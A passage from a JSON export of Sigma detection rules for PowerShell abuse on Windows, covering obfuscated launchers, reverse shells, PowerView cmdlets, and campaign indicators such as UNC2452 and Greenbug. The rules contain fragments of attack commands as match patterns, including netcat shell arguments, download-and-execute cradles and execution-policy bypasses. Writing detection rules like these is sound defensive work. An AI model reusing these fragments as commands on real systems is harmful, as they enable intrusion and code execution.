                    "11b52f18-aaec-4d60-9143-5dd8cc4706b9",
                    "62b7ccc9-23b4-471e-aa15-6da3663c4d59",
                    "8028c2c3-e25a-46e3-827f-bbb5abf181d7",
                    "487c7524-f892-4054-b263-8a0ace63fc25",
                    "f376c8a7-a2d0-4ddc-aa0c-16c17236d962",
                    "c260b6db-48ba-4b4a-a76f-2f67644e99d2",
                    "3236fcd0-b7e3-4433-b4f8-86ad61a9af2d",
                    "58cb02d5-78ce-4692-b3e1-dce850aae41a",
                    "02030f2f-6199-49ec-b258-ea71b07e03dc",
                    "b222df08-0e07-11eb-adc1-0242ac120002",
                    "ac20ae82-8758-4f38-958e-b44a3140ca88",
                    "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
                    "ca2092a1-c273-4878-9b4b-0d60115bf5ea",
                    "1ac8666b-046f-4201-8aba-1951aaec03a3",
                    "aa35a627-33fb-4d04-a165-d33b4afca3e8",
                    "07ad2ea8-6a55-4ac6-bf3e-91b8e59676eb",
                    "8d31a8ce-46b5-4dd6-bdc3-680931f1db86",
                    "6f8b3439-a203-45dc-a88b-abf57ea15ccf",
                    "8f70ac5f-1f6f-4f8e-b454-db19561216c5",
                    "b3512211-c67e-4707-bedc-66efc7848863",
                    "74ad4314-482e-4c3e-b237-3f7ed3b9ca8d",
                    "b66474aa-bd92-4333-a16c-298155b120df",
                    "21f9162c-5f5d-4b01-89a8-b705bd7d10ab",
                    "9ac8b09b-45de-4a07-9da1-0de8c09304a3",
                    "e55a5195-4724-480e-a77e-3ebe64bd3759",
                    "95eadcb2-92e4-4ed1-9031-92547773a6db",
                    "0adfbc14-0ed1-11eb-adc1-0242ac120002",
                    "243de76f-4725-4f2e-8225-a8a69b15ad61",
                    "1139d2e2-84b1-4226-b445-354492eba8ba",
                    "692f0bec-83ba-4d04-af7e-e884a96059b6",
                    "36210e0d-5b19-485d-a087-c096088885f0",
                    "73e733cc-1ace-3212-a107-ff2523cc9fc3",
                    "fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c",
                    "99b97608-3e21-4bfe-8217-2a127c396a0e",
                    "ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71",
                    "761270e6-3a97-4c18-9a44-a844cb5b562b",
                    "96cd126d-f970-49c4-848a-da3a09f55c55",
                    "f4bbd493-b796-416e-bbf2-121235348529",
                    "73e67340-0d25-11eb-adc1-0242ac120002",
                    "056a7ee1-4853-4e67-86a0-3fd9ceed7555",
                    "846b866e-2a57-46ee-8e16-85fa92759be7",
                    "63e3365d-4824-42d8-8b82-e56810fefa0c",
                    "6c96fc76-0eb1-11eb-adc1-0242ac120002",
                    "72862bf2-0eb1-11eb-adc1-0242ac120002",
                    "c86133ad-4725-4bd0-8170-210788e0a7ba",
                    "1816994b-42e1-4fb1-afd2-134d88184f71",
                    "1b9dc62e-6e9e-42a3-8990-94d7a10007f7",
                    "e4b63079-6198-405c-abd7-3fe8b0ce3263",
                    "86b896ba-ffa1-4fea-83e3-ee28a4c915c7",
                    "7eedcc9d-9fdb-4d94-9c54-474e8affc0c7",
                    "74403157-20f5-415d-89a7-c505779585cf",
                    "6331d09b-4785-4c13-980f-f96661356249",
                    "e6c54d94-498c-4562-a37c-b469d8e9a275",
                    "867613fb-fa60-4497-a017-a82df74a172c",
                    "1f49f2ab-26bc-48b3-96cc-dcffbc93eadf",
                    "96b9f619-aa91-478f-bacb-c3e50f8df575",
                    "88a22f69-62f9-4b8a-aa00-6b0212f2f05a",
                    "16b37b70-6fcf-4814-a092-c36bd3aafcbd",
                    "c539afac-c12a-46ed-b1bd-5a5567c9f045",
                    "6385697e-9f1b-40bd-8817-f4a91f40508e",
                    "641a4bfb-c017-44f7-800c-2aee0184ce9b",
                    "61d0475c-173f-4844-86f7-f3eebae1c66b",
                    "999bff6d-dc15-44c9-9f5c-e1051bfc86e1",
                    "9be34ad0-b6a7-4fbd-91cf-fc7ec1047f5f",
                    "bbb80e91-5746-4fbe-8898-122e2cafdbf4",
                    "4c54ba8f-73d2-4d40-8890-d9cf1dca3d30",
                    "7d1aaf3d-4304-425c-b7c3-162055e0b3ab",
                    "b6b49cd1-34d6-4ead-b1bf-176e9edba9a4",
                    "e8314f79-564d-4f79-bc13-fbc0bf2660d8",
                    "7a922f1b-2635-4d6c-91ef-af228b198ad3",
                    "a23791fe-8846-485a-b16b-ca691e1b03d4",
                    "df9a0e0e-fedb-4d6c-8668-d765dfc92aa7",
                    "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                    "ac7102b4-9e1e-4802-9b4f-17c5524c015c",
                    "65531a81-a694-4e31-ae04-f8ba5bc33759",
                    "60167e5c-84b2-4c95-a7ac-86281f27c445"
                ],
                "lookup_results": [
                    {
                        "uuid": "a136cde0-61ad-4a61-9b82-8dc490e60dd2",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of Clip.exe to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/13\ndescription: Detects Obfuscated use of Clip.exe to execute PowerShell\ndetection:\n  condition: selection_4103\n  selection_4103:\n    Payload|re: .*cmd.{0,5}(?:/c|/r).+clip(?:\\.exe)?.{0,4}&&.+clipboard]::\\(\\s\\\\\"\\{\\d\\}.+-f.+\"\nfalsepositives:\n- Unknown\nid: a136cde0-61ad-4a61-9b82-8dc490e60dd2\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nrelated:\n- id: 73e67340-0d25-11eb-adc1-0242ac120002\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation CLIP+ Launcher - PowerShell Module\n",
                            "sigma:id": "a136cde0-61ad-4a61-9b82-8dc490e60dd2",
                            "title": "Invoke-Obfuscation CLIP+ Launcher - PowerShell Module",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "b7155193-8a81-4d8f-805d-88de864ca50c",
                        "lookup_data": {
                            "description": "Detects a specific PowerShell command line pattern used by the UNC2452 actors as mentioned in Microsoft and Symantec reports",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2021/01/20\ndescription: Detects a specific PowerShell command line pattern used by the UNC2452\n  actors as mentioned in Microsoft and Symantec reports\ndetection:\n  condition: 1 of selection*\n  selection1:\n    CommandLine|contains|all:\n    - Invoke-WMIMethod win32_process -name create -argumentlist\n    - rundll32 c:\\windows\n  selection2:\n    CommandLine|contains|all:\n    - 'wmic /node:'\n    - process call create \"rundll32 c:\\windows\nfalsepositives:\n- Unlikely\nid: b7155193-8a81-4d8f-805d-88de864ca50c\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware\n- https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1047/T1047.md#atomic-test-7---create-a-process-using-wmi-query-and-an-encoded-command\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.t1047\ntitle: UNC2452 PowerShell Pattern\n",
                            "sigma:id": "b7155193-8a81-4d8f-805d-88de864ca50c",
                            "title": "UNC2452 PowerShell Pattern",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "a5a30a6e-75ca-4233-8b8c-42e0f2037d3b",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use Rundll32 in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2019/10/08\ndescription: Detects Obfuscated Powershell via use Rundll32 in Scripts\ndetection:\n  condition: selection_4104\n  selection_4104:\n    ScriptBlockText|contains:\n    - value\n    - invoke\n    - comspec\n    - iex\n    ScriptBlockText|contains|all:\n    - '&&'\n    - rundll32\n    - shell32.dll\n    - shellexec_rundll\nfalsepositives:\n- Unknown\nid: a5a30a6e-75ca-4233-8b8c-42e0f2037d3b\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use Rundll32 - PowerShell\n",
                            "sigma:id": "a5a30a6e-75ca-4233-8b8c-42e0f2037d3b",
                            "title": "Invoke-Obfuscation Via Use Rundll32 - PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "175997c5-803c-4b08-8bb0-70b099f47595",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via COMPRESS OBFUSCATION",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/18\ndescription: Detects Obfuscated Powershell via COMPRESS OBFUSCATION\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains:\n    - :system.io.compression.deflatestream\n    - system.io.streamreader\n    ImagePath|contains|all:\n    - new-object\n    - text.encoding]::ascii\n    - readtoend\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Unknown\nid: 175997c5-803c-4b08-8bb0-70b099f47595\nlevel: medium\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation COMPRESS OBFUSCATION - System\n",
                            "sigma:id": "175997c5-803c-4b08-8bb0-70b099f47595",
                            "title": "Invoke-Obfuscation COMPRESS OBFUSCATION - System",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "dcd74b95-3f36-4ed9-9598-0490951643aa",
                        "lookup_data": {
                            "description": "Detects Commandlet names from PowerView of PowerSploit exploitation framework.",
                            "raw": "author: Bhabesh Raj\ndate: 2021/05/18\ndescription: Detects Commandlet names from PowerView of PowerSploit exploitation framework.\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains:\n    - Add-DomainGroupMember\n    - Add-DomainObjectAcl\n    - Add-ObjectAcl\n    - Add-RemoteConnection\n    - Convert-ADName\n    - ConvertFrom-UACValue\n    - Convert-NameToSid\n    - ConvertTo-SID\n    - Export-PowerViewCSV\n    - Find-DomainLocalGroupMember\n    - Find-DomainObjectPropertyOutlier\n    - Find-DomainProcess\n    - Find-DomainShare\n    - Find-DomainUserEvent\n    - Find-DomainUserLocation\n    - Find-ForeignGroup\n    - Find-ForeignUser\n    - Find-GPOComputerAdmin\n    - Find-GPOLocation\n    - Find-InterestingDomain\n    - Find-InterestingFile\n    - Find-LocalAdminAccess\n    - Find-ManagedSecurityGroups\n    - Get-ADObject\n    - Get-CachedRDPConnection\n    - Get-DFSshare\n    - Get-DNSRecord\n    - Get-DNSZone\n    - Get-Domain\n    - Get-Forest\n    - Get-IPAddress\n    - Get-LastLoggedOn\n    - Get-LoggedOnLocal\n    - Get-NetComputer\n    - Get-NetDomain\n    - Get-NetFileServer\n    - Get-NetForest\n    - Get-NetGPO\n    - Get-NetGroup\n    - Get-NetLocalGroup\n    - Get-NetLoggedon\n    - Get-NetOU\n    - Get-NetProcess\n    - Get-NetRDPSession\n    - Get-NetSession\n    - Get-NetShare\n    - Get-NetSite\n    - Get-NetSubnet\n    - Get-NetUser\n    - Get-ObjectAcl\n    - Get-PathAcl\n    - Get-Proxy\n    - Get-RegistryMountedDrive\n    - Get-RegLoggedOn\n    - Get-SiteName\n    - Get-UserEvent\n    - Get-WMIProcess\n    - Get-WMIReg\n    - Invoke-ACLScanner\n    - Invoke-CheckLocalAdminAccess\n    - Invoke-EnumerateLocalAdmin\n    - Invoke-EventHunter\n    - Invoke-FileFinder\n    - Invoke-Kerberoast\n    - Invoke-MapDomainTrust\n    - Invoke-ProcessHunter\n    - Invoke-RevertToSelf\n    - Invoke-ShareFinder\n    - Invoke-UserHunter\n    - Invoke-UserImpersonation\n    - New-DomainGroup\n    - New-DomainUser\n    - Remove-RemoteConnection\n    - Request-SPNTicket\n    - Resolve-IPAddress\n    - Set-ADObject\n    - Set-DomainObject\n    - Set-DomainUserPassword\n    - Test-AdminAccess\nfalsepositives:\n- Should not be any as administrators do not use this tool\nid: dcd74b95-3f36-4ed9-9598-0490951643aa\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/02\nreferences:\n- https://powersploit.readthedocs.io/en/stable/Recon/README\n- https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon\n- https://thedfirreport.com/2020/10/08/ryuks-return\n- https://adsecurity.org/?p=2277\nrelated:\n- id: b2317cfa-4a47-4ead-b3ff-297438c0bc2d\n  type: similar\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Malicious PowerView PowerShell Commandlets\n",
                            "sigma:id": "dcd74b95-3f36-4ed9-9598-0490951643aa",
                            "title": "Malicious PowerView PowerShell Commandlets",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180",
                        "lookup_data": {
                            "description": "Detects use of executionpolicy option to set insecure policies",
                            "raw": "author: frack113\ndate: 2021/11/01\ndescription: Detects use of executionpolicy option to set insecure policies\ndetection:\n  condition: all of selection* and not filter\n  filter:\n    CommandLine|contains:\n    - C:\\Program Files\n    - C:\\ProgramData\n    - \\AppData\\Roaming\\Code\\\n  selection_level:\n    CommandLine|contains:\n    - Unrestricted\n    - bypass\n    - RemoteSigned\n  selection_option:\n    CommandLine|contains:\n    - ' -executionpolicy '\n    - ' -ep '\n    - ' -exec '\nfalsepositives:\n- Administrator script\nid: 87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/09/10\nreferences:\n- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.1\n- https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.1\n- https://adsecurity.org/?p=2604\n- https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/\nrelated:\n- id: cf2e938e-9a3e-4fe8-a347-411642b28a9f\n  type: similar\n- id: 61d0475c-173f-4844-86f7-f3eebae1c66b\n  type: similar\n- id: fad91067-08c5-4d1a-8d8c-d96a21b37814\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Change PowerShell Policies to an Insecure Level\n",
                            "sigma:id": "87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180",
                            "title": "Change PowerShell Policies to an Insecure Level",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "30a8cb77-8eb3-4cfb-8e79-ad457c5a4592",
                        "lookup_data": {
                            "description": "Detects renamed powershell",
                            "raw": "author: Harish Segar, frack113\ndate: 2020/06/29\ndescription: Detects renamed powershell\ndetection:\n  condition: selection and not filter\n  filter:\n    HostApplication|startswith:\n    - powershell.exe\n    - C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  selection:\n    HostName: ConsoleHost\nfalsepositives:\n- Unknown\nid: 30a8cb77-8eb3-4cfb-8e79-ad457c5a4592\nlevel: low\nlogsource:\n  category: ps_classic_start\n  definition: fields have to be extract from event\n  product: windows\nmodified: 2021/10/16\nreferences:\n- https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Renamed Powershell Under Powershell Channel\n",
                            "sigma:id": "30a8cb77-8eb3-4cfb-8e79-ad457c5a4592",
                            "title": "Renamed Powershell Under Powershell Channel",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fe6e002f-f244-4278-9263-20e4b593827f",
                        "lookup_data": {
                            "description": "Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe",
                            "raw": "author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)\ndate: 2019/09/12\ndescription: Detects alternate PowerShell hosts potentially bypassing detections looking\n  for powershell.exe\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_aurora:\n    Image: null\n  filter_generic:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\mscorsvw.exe\n  - Image|startswith:\n    - C:\\Program Files (x86)\\Microsoft Visual Studio\\\n    - C:\\Program Files\\Microsoft Visual Studio\\\n    - C:\\Windows\\System32\\\n    - C:\\Program Files\\Citrix\\ConfigSync\\\n  - Image: C:\\Program Files\\PowerShell\\7\\pwsh.exe\n  selection:\n    Description: System.Management.Automation\n    ImageLoaded|contains: System.Management.Automation\nfalsepositives:\n- Unknown\nid: fe6e002f-f244-4278-9263-20e4b593827f\nlevel: low\nlogsource:\n  category: image_load\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190610201010.html\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Alternate PowerShell Hosts - Image\n",
                            "sigma:id": "fe6e002f-f244-4278-9263-20e4b593827f",
                            "title": "Alternate PowerShell Hosts - Image",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "78aa1347-1517-4454-9982-b338d6df8343",
                        "lookup_data": {
                            "description": "Adversaries may abuse PowerShell commands and scripts for execution.\nPowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell)\nAdversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code\n",
                            "raw": "author: frack113, MatilJ\ndate: 2022/01/19\ndescription: 'Adversaries may abuse PowerShell commands and scripts for execution.\n\n  PowerShell is a powerful interactive command-line interface and scripting environment\n  included in the Windows operating system. (Citation: TechNet PowerShell)\n\n  Adversaries can use PowerShell to perform a number of actions, including discovery\n  of information and execution of code\n\n  '\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - New-Object\n    - -ComObject\n    - MsXml2.\n    - XmlHttp\nfalsepositives:\n- Legitimate administrative script\nid: 78aa1347-1517-4454-9982-b338d6df8343\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/05/19\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-7---powershell-msxml-com-object---with-prompt\n- https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms766431(v=vs.85)\n- https://www.trendmicro.com/en_id/research/22/e/uncovering-a-kingminer-botnet-attack-using-trend-micro-managed-x.html\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Powershell MsXml COM Object\n",
                            "sigma:id": "78aa1347-1517-4454-9982-b338d6df8343",
                            "title": "Powershell MsXml COM Object",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
                        "lookup_data": {
                            "description": "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) viq CommandLine",
                            "raw": "author: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin\n  Songer @austinsonger\ndate: 2019/10/24\ndescription: Detects the use of various web request commands with commandline tools\n  and Windows PowerShell cmdlets (including aliases) viq CommandLine\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - Invoke-WebRequest\n    - 'iwr '\n    - 'wget '\n    - 'curl '\n    - Net.WebClient\n    - Start-BitsTransfer\n    - Resume-BitsTransfer\n    - '[System.Net.WebRequest]::create'\n    - Invoke-RestMethod\n    - WinHttp.WinHttpRequest\nfalsepositives:\n- Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/10\nreferences:\n- https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n- https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n- https://docs.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nrelated:\n- id: 1139d2e2-84b1-4226-b445-354492eba8ba\n  type: similar\n- id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n  type: obsoletes\n- id: cd5c8085-4070-4e22-908d-a5b3342deb74\n  type: obsoletes\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Usage Of Web Request Commands And Cmdlets\n",
                            "sigma:id": "9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d",
                            "title": "Usage Of Web Request Commands And Cmdlets",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3711eee4-a808-4849-8a14-faf733da3612",
                        "lookup_data": {
                            "description": "Detects tools and process executions as observed in a Greenbug campaign in May 2020",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/05/20\ndescription: Detects tools and process executions as observed in a Greenbug campaign\n  in May 2020\ndetection:\n  condition: 1 of selection*\n  selection1:\n    CommandLine|contains|all:\n    - bitsadmin\n    - /transfer\n    - CSIDL_APPDATA\n  selection2:\n    CommandLine|contains: CSIDL_SYSTEM_DRIVE\n  selection3:\n    CommandLine|contains:\n    - \\msf.ps1\n    - 8989 -e cmd.exe\n    - system.Data.SqlClient.SqlDataAdapter($cmd); [void]$da.fill\n    - -nop -w hidden -c $k=new-object\n    - '[Net.CredentialCache]::DefaultCredentials;IEX '\n    - ' -nop -w hidden -c $m=new-object net.webclient;$m'\n    - -noninteractive -executionpolicy bypass whoami\n    - -noninteractive -executionpolicy bypass netstat -a\n    - L3NlcnZlcj1\n  selection4:\n    Image|endswith:\n    - \\adobe\\Adobe.exe\n    - \\oracle\\local.exe\n    - \\revshell.exe\n    - infopagesbackup\\ncat.exe\n    - CSIDL_SYSTEM\\cmd.exe\n    - \\programdata\\oracle\\java.exe\n    - CSIDL_COMMON_APPDATA\\comms\\comms.exe\n    - \\Programdata\\VMware\\Vmware.exe\nfalsepositives:\n- Unknown\nid: 3711eee4-a808-4849-8a14-faf733da3612\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/09/21\nreferences:\n- https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/greenbug-espionage-telco-south-asia\nstatus: test\ntags:\n- attack.g0049\n- attack.execution\n- attack.t1059.001\n- attack.command_and_control\n- attack.t1105\n- attack.defense_evasion\n- attack.t1036.005\ntitle: Greenbug Campaign Indicators\n",
                            "sigma:id": "3711eee4-a808-4849-8a14-faf733da3612",
                            "title": "Greenbug Campaign Indicators",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "afd3df04-948d-46f6-ae44-25966c44b97f",
                        "lookup_data": {
                            "description": "Detects the use of PSAsyncShell an Asynchronous TCP Reverse Shell written in powershell",
                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/10/04\ndescription: Detects the use of PSAsyncShell an Asynchronous TCP Reverse Shell written\n  in powershell\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains: PSAsyncShell\nfalsepositives:\n- Unlikely\nid: afd3df04-948d-46f6-ae44-25966c44b97f\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/JoelGMSec/PSAsyncShell\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: PSAsyncShell - Asynchronous TCP Reverse Shell\n",
                            "sigma:id": "afd3df04-948d-46f6-ae44-25966c44b97f",
                            "title": "PSAsyncShell - Asynchronous TCP Reverse Shell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "14bcba49-a428-42d9-b943-e2ce0f0f7ae6",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via VAR++ LAUNCHER",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/13\ndescription: Detects Obfuscated Powershell via VAR++ LAUNCHER\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains:\n    - '{0}'\n    - '{1}'\n    - '{2}'\n    - '{3}'\n    - '{4}'\n    - '{5}'\n    ImagePath|contains|all:\n    - '&&set'\n    - cmd\n    - /c\n    - -f\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Unknown\nid: 14bcba49-a428-42d9-b943-e2ce0f0f7ae6\nlevel: high\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION - System\n",
                            "sigma:id": "14bcba49-a428-42d9-b943-e2ce0f0f7ae6",
                            "title": "Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION - System",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "02773bed-83bf-469f-b7ff-e676e7d78bab",
                        "lookup_data": {
                            "description": "Detects default file names outputted by the BloodHound collection tool SharpHound",
                            "raw": "author: C.J. May\ndate: 2022/08/09\ndescription: Detects default file names outputted by the BloodHound collection tool\n  SharpHound\ndetection:\n  condition: 1 of selection*\n  selection1:\n    TargetFilename|endswith:\n    - _BloodHound.zip\n    - _computers.json\n    - _containers.json\n    - _domains.json\n    - _gpos.json\n    - _groups.json\n    - _ous.json\n    - _users.json\n  selection2:\n    TargetFilename|contains|all:\n    - BloodHound\n    - .zip\nfalsepositives:\n- Unknown\nid: 02773bed-83bf-469f-b7ff-e676e7d78bab\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/08/09\nreferences:\n- https://academy.hackthebox.com/course/preview/active-directory-bloodhound/bloodhound--data-collection\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.001\n- attack.t1069.002\n- attack.execution\n- attack.t1059.001\ntitle: BloodHound Collection Files\n",
                            "sigma:id": "02773bed-83bf-469f-b7ff-e676e7d78bab",
                            "title": "BloodHound Collection Files",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "e0a41412-c69a-446f-8e6e-0e6d7483dad7",
                        "lookup_data": {
                            "description": "Detects files created during the local privilege exploitation of CVE-2022-24527 Microsoft Connected Cache",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/04/13\ndescription: Detects files created during the local privilege exploitation of CVE-2022-24527\n  Microsoft Connected Cache\ndetection:\n  condition: selection and not filter\n  filter:\n    User|contains:\n    - AUTHORI\n    - AUTORI\n  selection:\n    TargetFilename|endswith: WindowsPowerShell\\Modules\\webAdministration\\webAdministration.psm1\nfalsepositives:\n- Unknown\nid: e0a41412-c69a-446f-8e6e-0e6d7483dad7\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nreferences:\n- https://www.rapid7.com/blog/post/2022/04/12/cve-2022-24527-microsoft-connected-cache-local-privilege-escalation-fixed/\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.t1059.001\n- cve.2022.24527\ntitle: CVE-2022-24527 Microsoft Connected Cache LPE\n",
                            "sigma:id": "e0a41412-c69a-446f-8e6e-0e6d7483dad7",
                            "title": "CVE-2022-24527 Microsoft Connected Cache LPE",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "2b30fa36-3a18-402f-a22d-bf4ce2189f35",
                        "lookup_data": {
                            "description": "Detects activity that could be related to Baby Shark malware",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/02/24\ndescription: Detects activity that could be related to Baby Shark malware\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\"\n    - powershell.exe mshta.exe http\n    - cmd.exe /c taskkill /im cmd.exe\nfalsepositives:\n- Unknown\nid: 2b30fa36-3a18-402f-a22d-bf4ce2189f35\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.003\n- attack.t1059.001\n- attack.discovery\n- attack.t1012\n- attack.defense_evasion\n- attack.t1218.005\ntitle: Baby Shark Activity\n",
                            "sigma:id": "2b30fa36-3a18-402f-a22d-bf4ce2189f35",
                            "title": "Baby Shark Activity",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "403c2cc0-7f6b-4925-9423-bfa573bed7eb",
                        "lookup_data": {
                            "description": "Detects suspicious PowerShell download command",
